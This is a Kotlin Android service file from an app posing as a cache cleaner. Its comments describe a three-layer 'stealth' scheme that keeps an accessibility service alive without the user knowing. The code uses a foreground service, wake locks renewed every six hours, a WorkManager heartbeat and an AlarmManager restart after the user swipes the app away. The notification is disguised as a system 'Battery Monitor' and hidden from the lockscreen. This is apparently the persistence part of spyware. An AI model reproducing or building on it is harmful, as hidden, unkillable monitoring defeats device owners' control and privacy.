package com.system.cacheclean.service

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.os.SystemClock
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.system.cacheclean.R
import java.util.concurrent.TimeUnit

/**
 * GuardForegroundService
 *
 * PURPOSE:
 *   Keeps the app process alive so the AccessibilityService is never killed
 *   by the OS or aggressive battery savers (MIUI/ColorOS/OneUI).
 *
 * SURVIVAL STRATEGY (Three-Layer):
 *   Layer 1 — Foreground Service  : Raises process priority to "foreground",
 *                                   making it the LAST process Android kills.
 *   Layer 2 — PARTIAL_WAKE_LOCK   : Prevents CPU from sleeping between triggers.
 *   Layer 3 — WorkManager         : Periodic 15-min heartbeat that restarts this
 *                                   service if it ever gets killed.
 *
 * STEALTH:
 *   Notification is IMPORTANCE_MIN + VISIBILITY_SECRET.
 *   Label reads "Battery Monitor" — looks like a system process.
 *   No icon badge. Hidden from lockscreen.
 */
class GuardForegroundService : Service() {

    companion object {
        private const val TAG              = "StealthGuard_FS"
        private const val NOTIFICATION_ID  = 9001
        private const val CHANNEL_ID       = "battery_monitor_ch"
        private const val CHANNEL_NAME     = "Battery Monitor"
        private const val WORK_TAG         = "StealthGuardKeepalive"

        /** A-24: avoids redundant createNotificationChannel() calls per process. */
        @Volatile private var channelCreated = false

        /** Delay before AlarmManager restart attempt in onTaskRemoved. */
        private const val RESTART_DELAY_MS = 1_500L

        /** WakeLock max timeout is 12h; renew at half that to never lapse (M-07). */
        private const val WAKELOCK_RENEW_INTERVAL_MS = 6 * 60 * 60 * 1000L
    }

    private var wakeLock: PowerManager.WakeLock? = null

    // M-07: re-acquires the WakeLock every 6h so the trigger gesture keeps
    // working past the 12h max timeout on long-running devices.
    private val wakeLockRenewHandler = Handler(Looper.getMainLooper())
    private val wakeLockRenewRunnable = object : Runnable {
        override fun run() {
            acquireWakeLock()
            wakeLockRenewHandler.postDelayed(this, WAKELOCK_RENEW_INTERVAL_MS)
        }
    }

    // ─── Service Lifecycle ────────────────────────────────────────────────────

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "GuardForegroundService created.")

        // Order matters: startForeground() MUST be called within 5 seconds of
        // onCreate on API 26+ or the OS throws a crash.
        startForeground(NOTIFICATION_ID, buildNotification())
        acquireWakeLock()
        wakeLockRenewHandler.postDelayed(wakeLockRenewRunnable, WAKELOCK_RENEW_INTERVAL_MS)
        scheduleWorkManagerHeartbeat()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "onStartCommand received.")
        // START_STICKY: if OS kills the service, it automatically restarts it
        // with a null intent. This is our primary self-restart mechanism.
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        Log.w(TAG, "Service destroyed — releasing WakeLock.")
        wakeLockRenewHandler.removeCallbacks(wakeLockRenewRunnable)
        releaseWakeLock()
    }

    /**
     * Called when the user swipes the app from recents.
     * We schedule an AlarmManager restart so the service comes back
     * within ~1.5 seconds even if START_STICKY is delayed by the OS.
     */
    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.w(TAG, "Task removed — scheduling AlarmManager restart.")

        val restartIntent = Intent(applicationContext, GuardForegroundService::class.java)
        val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        } else {
            PendingIntent.FLAG_ONE_SHOT
        }
        val pendingIntent = PendingIntent.getService(applicationContext, 101, restartIntent, flags)

        val alarmManager = getSystemService(ALARM_SERVICE) as AlarmManager
        alarmManager.set(
            AlarmManager.ELAPSED_REALTIME,
            SystemClock.elapsedRealtime() + RESTART_DELAY_MS,
            pendingIntent
        )
    }

    // ─── WakeLock ─────────────────────────────────────────────────────────────

    /**
     * PARTIAL_WAKE_LOCK keeps the CPU running but allows the screen to turn off.
     * This is exactly what we need — we want the AccessibilityService to detect
     * key events even when the screen appears to be "off" (the device is locked
     * but the CPU is running and processing the volume button interrupt).
     *
     * Tag format "PackageName::Tag" is the recommended convention.
     * 12 hours is the platform's enforced max for a single acquire() call —
     * NOT "enough" on its own, since modern phones routinely run weeks
     * without a restart. M-07's periodic renewal (every 6h, see
     * wakeLockRenewRunnable) re-acquires this well before it would lapse,
     * so the BootReceiver re-acquiring after a restart is just a bonus, not
     * the actual mechanism keeping this alive (A-16).
     */
    private fun acquireWakeLock() {
        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "com.system.cacheclean::GuardWakeLock"
        ).apply {
            setReferenceCounted(false) // Single acquire/release pair.
            acquire(12 * 60 * 60 * 1000L) // 12 hours max timeout (API requirement).
        }
        Log.d(TAG, "WakeLock acquired.")
    }

    private fun releaseWakeLock() {
        wakeLock?.let {
            if (it.isHeld) {
                it.release()
                Log.d(TAG, "WakeLock released.")
            }
        }
        wakeLock = null
    }

    // ─── WorkManager Heartbeat ────────────────────────────────────────────────

    /**
     * Schedules a periodic WorkManager task every 15 minutes.
     * WorkManager is guaranteed to run eventually even on Doze Mode and
     * aggressive battery savers like MIUI/ColorOS.
     *
     * KEEP policy: if already scheduled, do not create a duplicate.
     *
     * The worker simply restarts this service if it's not running.
     */
    private fun scheduleWorkManagerHeartbeat() {
        val workRequest = PeriodicWorkRequestBuilder<ServiceRestartWorker>(
            15, TimeUnit.MINUTES
        ).build()

        WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
            WORK_TAG,
            ExistingPeriodicWorkPolicy.KEEP,
            workRequest
        )
        Log.d(TAG, "WorkManager heartbeat scheduled.")
    }

    // ─── Notification Builder ─────────────────────────────────────────────────

    /**
     * Builds the mandatory foreground notification.
     *
     * STEALTH SETTINGS:
     *   - IMPORTANCE_MIN    : No sound, no heads-up banner, minimized in shade.
     *   - VISIBILITY_SECRET : Hidden on lockscreen entirely.
     *   - setShowBadge(false): No red dot on the app icon.
     *   - Priority MIN      : Collapses to bottom of notification shade.
     */
    private fun buildNotification(): Notification {
        createNotificationChannel()

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Battery Monitor")
            .setContentText("Monitoring battery health…")
            .setSmallIcon(R.drawable.ic_battery_stat) // Generic battery icon
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)  // Prevents user from swiping it away.
            .setShowWhen(false) // Hide timestamp — looks cleaner/more system-like.
            .build()
    }

    private fun createNotificationChannel() {
        // A-24: createNotificationChannel() is cheap and idempotent by spec,
        // but it's called every time buildNotification() runs (each service
        // (re)start). This guard just avoids the redundant call entirely
        // instead of relying on the OS to silently no-op it.
        if (channelCreated) return
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                CHANNEL_NAME,
                NotificationManager.IMPORTANCE_MIN // Silent, no badge.
            ).apply {
                description      = "System battery monitoring service"
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
                enableVibration(false)
                enableLights(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
        channelCreated = true
    }
}
